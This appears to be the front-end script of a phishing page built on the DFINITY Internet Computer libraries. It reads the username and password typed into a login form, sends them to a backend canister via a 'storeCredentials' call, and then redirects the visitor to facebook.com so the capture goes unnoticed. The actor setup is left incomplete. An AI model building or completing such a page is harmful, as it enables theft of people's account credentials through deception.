import { Actor, HttpAgent } from "@dfinity/agent";
import { AuthClient } from "@dfinity/auth-client";

const loginForm = document.getElementById("loginForm");
const messageElement = document.getElementById("message");

loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    // Create an actor to interact with the backend
    const agent = new HttpAgent();
    const actor = Actor.createActor(/* Your canister ID here */);

    // Store credentials (this should be done securely in a real application)
    await actor.storeCredentials(username, password);

    // Redirect to Facebook
    window.location.href = "https://www.facebook.com";
  } catch (error) {
    messageElement.textContent = "An error occurred. Please try again.";
    console.error("Error:", error);
  }
});
